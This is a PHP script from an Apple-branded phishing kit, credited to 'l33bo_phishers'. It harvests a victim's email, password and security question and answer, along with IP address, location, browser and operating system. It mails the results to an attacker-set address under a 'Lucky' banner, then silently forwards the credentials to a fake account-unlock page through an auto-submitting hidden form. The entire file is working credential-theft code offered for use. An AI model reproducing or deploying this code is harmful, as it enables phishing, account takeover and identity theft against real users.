<?
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "session_protect.php";
require "functions.php";
require "../../CONTROLS.php";

$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass']; 
$ip = $_SERVER['REMOTE_ADDR'];
$email    = $_POST['user'];
$password = $_POST['pass'];
$question  = $_POST['q1'];
$answer     = $_POST['a1'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$message   = "
++========[ $$ Lucky $$ ]========++

Email :  ".$email."
Pass  :  ".$password."


Security Question   : ".$question."
Security Answer     : ".$answer."

IP Info   :  ".$VictimInfo1." | ".$VictimInfo2."
Browser   :  ".$VictimInfo3."

     .++===[ Thanks ]===++
";
$subject = "Apple (".$systemInfo['country'].") (".$ip.")";
$headers = "From: ".$email." <localheart@idx>";
mail($Your_Email, $subject, $message, $headers);
?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>	